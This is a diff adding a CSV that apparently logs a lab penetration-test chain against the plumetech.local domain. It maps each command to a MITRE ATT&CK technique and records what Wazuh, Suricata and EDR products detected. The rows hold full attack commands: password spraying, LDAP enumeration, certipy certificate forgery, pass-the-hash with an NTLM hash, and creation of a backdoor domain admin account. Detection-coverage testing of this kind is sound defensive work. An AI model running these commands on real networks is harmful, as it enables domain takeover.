@@ -1,0 +1,16 @@
+Time;Commands/Tools;Tactic;Technique;Wazuh default;Wazuh custom;Suricata ET;Suricata Custom;Vendor B NIDS;Vendor A EDR;Vendor A EDR IDP
+N/A;;Resource Development;Obtain Capabilities: Exploits - T1588.005;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A
+N/A;;Initial Access;External Remote Services - T1133;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A
+N/A;;Initial Access;Valid Accounts - T1078;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A
+15:26;nmap -sT -T 3 -p 389,445,3389,22,80 10.0.9.0/24 -oA network_scan;Reconnaissance;Network Service Discovery - T1046;None,N/A;None,N/A;Technique,Low;None,N/A;None,N/A;None,N/A;None,N/A
+15:26;nmap -sT -T 3 -p 389,445,3389,22,80 10.0.9.0/24 -oA network_scan;Reconnaissance;Remote System Discovery - T1018;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
+15:21;curl;Reconnaissance;Search Victim-Owned Websites - T1594;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
+15:21;curl;Reconnaissance;Gather Victim Identity Information: Email Addresses - T1589.002;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
+15:30;nxc smb 10.0.9.11 -u ./users -p 2023-200_most_used_passwords.txt;Credential Access;Brute Force: Password Spraying - T1110.003;Technique,Medium;Technique,Medium;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
+15:31;"nxc ldap 10.0.9.11 -u damon -p 'Cindylee1' -M group-mem -o GROUP=""Domain Admins""";Initial Access;Valid Accounts - T1078;Technique,Low;Technique,Low;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
+15:31;"nxc ldap 10.0.9.11 -u damon -p 'Cindylee1' --query ""(sAMAccountName=manuel)"" """" ";Reconnaissance;Account Discovery: Domain Account - T1087.002;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
+15:31;"nxc ldap 10.0.9.11 -u damon -p 'Cindylee1' -M group-mem -o GROUP=""Domain Admins""";Reconnaissance;Permission Groups Discovery - T1069;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
+15:37;certipy-ad find -enabled -u damon@PLUMETECH -p 'Cindylee1' -dc-ip 10.0.9.11, certipy-ad req -username damon@plumetech.local -p 'Cindylee1' -ca PLUMETECH-DC1-CA -template 'Smartcard' -upn manuel@plumetech.local -target 10.0.9.11 -sid S-1-5-21-742041295-2727698780-1124300366-1113;Credential Access;Steal or Forge Authentication Certificates - T1649;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;Technique,Informational
+15:38;certipy-ad auth -pfx manuel.pfx -dc-ip 10.0.9.11;Initial Access;Valid Accounts - T1078;Technique,Low;Technique,Low;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
+15:39;nxc smb 10.0.9.11 -u manuel -H 'aad3b435b51404eeaad3b435b51404ee:c7c1e58f57e5c784b78ab63a3546aaed' -x 'net user plumber Pentest123 /domain /add';Persistence;Create Account: Domain Account - T1136.002;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;Technique,High;None,N/A
+15:40;"nxc smb 10.0.9.11 -u manuel -H 'aad3b435b51404eeaad3b435b51404ee:c7c1e58f57e5c784b78ab63a3546aaed' -x 'net group ""Server Admins"" plumber /domain /add'";Persistence;Account Manipulation: Additional Local or Domain Groups - T1098.007;Technique,Low;Technique,Low;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
